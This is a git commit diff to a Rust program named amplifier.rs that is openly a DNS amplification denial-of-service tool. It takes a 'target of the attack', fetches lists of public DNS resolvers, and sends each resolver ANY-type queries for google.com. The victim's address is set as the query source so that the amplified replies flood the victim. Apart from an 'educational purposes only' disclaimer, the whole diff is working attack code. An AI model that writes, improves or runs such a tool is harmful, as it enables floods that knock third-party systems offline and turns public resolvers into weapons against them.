b627a84d4336139f4fa0b0e3c59353d23d3c6eb3
David Stromberger <DavidStromberger99@gmx.de>
2023-04-07 13:05:48 +0200

    Update

--- src/amplifier.rs
+++ src/amplifier.rs
@@ -4,12 +4,21 @@
 // Version: 0.1.0
 // Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
 
+use clap::{arg, command, Parser};
 use reqwest;
-use std::net::IpAddr;
+use trust_dns_resolver::config::ResolverOpts;
+use std::fs::File;
+use std::io::{self, BufRead, BufReader};
+use std::net::{IpAddr, SocketAddr};
 use std::str::FromStr;
 use tokio;
-use tokio::net::UdpSocket;
-use clap::{Parser, command, arg};
+use trust_dns_proto::rr::record_type::RecordType;
+use trust_dns_resolver::lookup::Lookup;
+use trust_dns_resolver::{
+    config::{NameServerConfig, Protocol, ResolverConfig},
+    error::ResolveResult,
+    TokioAsyncResolver,
+};
 
 async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
@@ -18,34 +27,58 @@ async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::e
     Ok(servers)
 }
 
-async fn resolve_dns(server: IpAddr, domain: &str) -> Result<Vec<u8>, std::io::Error> {
-    let socket = match server {
-        IpAddr::V4(_) => UdpSocket::bind(("0.0.0.0", 0)).await?,
-        IpAddr::V6(_) => UdpSocket::bind(("::", 0)).await?,
-    };
+fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
+    let file = File::open(file)?;
+    let reader = BufReader::new(file);
 
-    // Set the query buffer
-    let mut query = Vec::new();
-    query.extend_from_slice(&[0; 2]); // ID
-    query.extend_from_slice(&[1, 0, 0, 0, 0, 1]); // Flags
-    query.extend_from_slice(&[0, 0x10]); // Query type
-    query.extend_from_slice(&[0, 1]); // Query class
-    for part in domain.split('.') {
-        query.push(part.len() as u8);
-        query.extend_from_slice(part.as_bytes());
+    let mut dns_servers = Vec::new();
+
+    for line in reader.lines() {
+        let line = line?;
+        let line = line.trim();
+
+        // Ignore empty lines and lines that start with a comment character
+        if !line.is_empty() && !line.starts_with('#') {
+            dns_servers.push(line.to_owned());
+        }
     }
-    query.push(0); // End of domain name
 
-    let server_socket_addr = (server, 53);
-    socket.send_to(&query, server_socket_addr).await?;
-
-    Ok(vec![])
+    Ok(dns_servers)
 }
 
-async fn send_queries(server: String) -> Result<(), Box<dyn std::error::Error>> {
-    let ip_addr = IpAddr::from_str(&server)?;
-    resolve_dns(ip_addr, "google.com").await?;
-    println!("{}: query sent", server);
+async fn send_dns_query(
+    dns_server: IpAddr,
+    domain: &str,
+    source_ip: IpAddr,
+    record_type: RecordType,
+) -> ResolveResult<Lookup> {
+
+    let dns_server_socket = SocketAddr::new(dns_server, 53);
+    let source_ip_socket = SocketAddr::new(source_ip, 0);
+
+    let mut resolver_config: ResolverConfig = ResolverConfig::default();
+    resolver_config.add_name_server(NameServerConfig {
+        socket_addr: dns_server_socket,
+        protocol: Protocol::Udp,
+        tls_dns_name: None,
+        trust_nx_responses: false,
+        bind_addr: Some(source_ip_socket),
+    });
+
+    let resolver = TokioAsyncResolver::tokio(resolver_config, ResolverOpts::default()).unwrap();
+    
+    // Send a DNS query to the resolver for the specified domain and record type
+    let response = resolver.lookup(domain, record_type).await?;
+
+    // Return the list of resource records in the response
+    Ok(response)
+}
+
+async fn amplify(dns_server: &str, domain: &str, source_ip: &str, record_type: RecordType) -> Result<(), Box<dyn std::error::Error>> {
+    let dns_server = IpAddr::from_str(dns_server)?;
+    let source_ip = IpAddr::from_str(source_ip)?;
+    let response = send_dns_query(dns_server, domain, source_ip, record_type);
+    println!("{:?}", response.await?);
     Ok(())
 }
 
@@ -55,27 +88,31 @@ struct Args {
     /// Target of the attack
     #[arg(required = true)]
     target: String,
+    /// Record type to use
+    #[arg(short = 'r', long = "record-type", required = false, default_value = "ANY")]
+    record_type: Option<String>,
     /// List of dns servers to use
     #[arg(short, long, required = false)]
-    server_list: String,
+    server_list: Option<String>,
     /// Time the attack should run
     #[arg(short, long, required = false)]
-    time: u32,
+    time: Option<u32>,
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
-    if args.server_list.is_empty() {
-        let servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
-        println!("{} DNS servers found:", servers.len());
-        for server in &servers {
-            let result = send_queries(server.to_string()).await;
-            if let Err(e) = result {
-                println!("Error sending query to {}: {}", server, e);
-            }
+    let servers: Vec<String>;
+    if args.server_list.is_none() {
+        servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
+    } else {
+        servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
+    }
+    for server in &servers {
+        let result = amplify(server, "google.com", &args.target, RecordType::ANY).await;
+        if let Err(e) = result {
+            println!("Error sending query to {}: {}", server, e);
         }
-        return Ok(());
     }
     Ok(())
 }
